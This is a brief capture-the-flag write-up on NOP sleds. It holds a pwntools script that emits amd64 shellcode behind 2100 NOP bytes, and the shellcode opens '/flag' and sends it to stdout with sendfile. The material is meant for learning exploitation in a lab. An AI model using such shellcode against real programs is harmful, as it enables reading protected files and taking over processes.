# NOP Sleds

#### Same as the last challenge only there needs to be a buffer of NOP's. The idea is that when the program skips lines, it will land on a NOP which forces it to slide to the next line. With enough of these, the program will slide all the way to the assembly.
```python
from pwn import *
import sys

context.arch = 'amd64'

asmbly = """
xor rsi, rsi
push rsi
mov rdi, 0x67616c662f
push rdi
mov rdi, rsp
mov rax, 2
syscall

mov rsi, rax
mov rdi, 1
mov r10, 1000
mov rax, 40
xor rdx, rdx
syscall

mov rax, 60
xor rdi, rdi
syscall
"""

asmbly = asm(asmbly)
fill = b'\x90' * 2100
sys.stdout.buffer.write(fill + asmbly)
```
